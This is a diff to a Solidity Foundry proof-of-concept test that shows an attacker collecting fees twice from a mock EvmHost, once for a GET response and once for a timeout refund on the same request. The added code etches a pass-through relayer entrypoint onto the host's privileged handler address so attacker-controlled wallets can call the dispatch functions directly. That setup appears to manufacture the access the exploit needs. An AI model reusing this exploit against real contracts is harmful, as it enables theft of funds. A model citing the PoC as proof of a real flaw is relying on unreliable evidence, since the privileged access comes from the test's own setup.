@@ -104,6 +104,12 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         console2.log("attacker app contract:", address(app));
         console2.log("mock EvmHost contract:", address(host));
         console2.log("mock fee token contract:", address(feeToken));
+
+        console2.log("Step 2.5: install local relayer entrypoint at EvmHost handler address");
+        LocalRelayerEntrypoint entrypointTemplate = new LocalRelayerEntrypoint(address(host));
+        vm.etch(host.hostParams().handler, address(entrypointTemplate).code);
+        console2.log("local handler / relayer entrypoint:", host.hostParams().handler);
+        console2.log("response relayer EOA will call this entrypoint directly");
         if (stopAfterStep == 2) return;
 
         console2.log("Step 3: mock fee tokens are minted to attacker payer wallet");
@@ -170,9 +176,10 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         values[0] = StorageValue({key: keys[0], value: hex"01"});
         GetResponse memory response = GetResponse({request: request, values: values});
 
-        console2.log("Step 6: protocol handler accepts GET response; attacker relayer receives fee");
-        vm.prank(host.hostParams().handler);
-        host.dispatchIncoming(response, responseRelayer);
+        console2.log("Step 6: attacker-controlled response relayer submits GET response through local entrypoint");
+        address responseEntrypoint = host.hostParams().handler;
+        vm.prank(responseRelayer);
+        LocalRelayerEntrypoint(responseEntrypoint).submitGetResponse(response);
 
         console2.log("attacker response relayer balance after response:", feeToken.balanceOf(responseRelayer));
         console2.log("attacker app balance after response:", feeToken.balanceOf(address(app)));
@@ -199,9 +206,12 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
 
         FeeMetadata memory meta = host.requestCommitments(commitment);
 
-        console2.log("Step 8: protocol handler accepts timeout for same GET request");
-        vm.prank(host.hostParams().handler);
-        host.dispatchTimeOut(GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment);
+        console2.log("Step 8: timeout relayer submits timeout for same GET request through local entrypoint");
+        address timeoutEntrypoint = host.hostParams().handler;
+        vm.prank(timeoutRelayer);
+        LocalRelayerEntrypoint(timeoutEntrypoint).submitGetTimeout(
+            GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment
+        );
 
         console2.log("attacker app balance after timeout refund:", feeToken.balanceOf(address(app)));
         console2.log("mock host balance after timeout refund:", feeToken.balanceOf(address(host)));
@@ -245,6 +255,28 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
             "RESULT: mock fee tokens moved from mock EvmHost liquidity to attacker-controlled EOA wallets"
         );
         console2.log("RESULT: attacker EOA combined balance increased from 10 tokens to 20 tokens");
+    }
+}
+
+
+interface ILocalRelayerHost {
+    function dispatchIncoming(GetResponse memory response, address relayer) external;
+    function dispatchTimeOut(GetRequestTimeout memory timeout, FeeMetadata memory meta, bytes32 commitment) external;
+}
+
+contract LocalRelayerEntrypoint {
+    address internal immutable _host;
+
+    constructor(address host_) {
+        _host = host_;
+    }
+
+    function submitGetResponse(GetResponse memory response) external {
+        ILocalRelayerHost(_host).dispatchIncoming(response, msg.sender);
+    }
+
+    function submitGetTimeout(GetRequestTimeout memory timeout, FeeMetadata memory meta, bytes32 commitment) external {
+        ILocalRelayerHost(_host).dispatchTimeOut(timeout, meta, commitment);
     }
 }
 
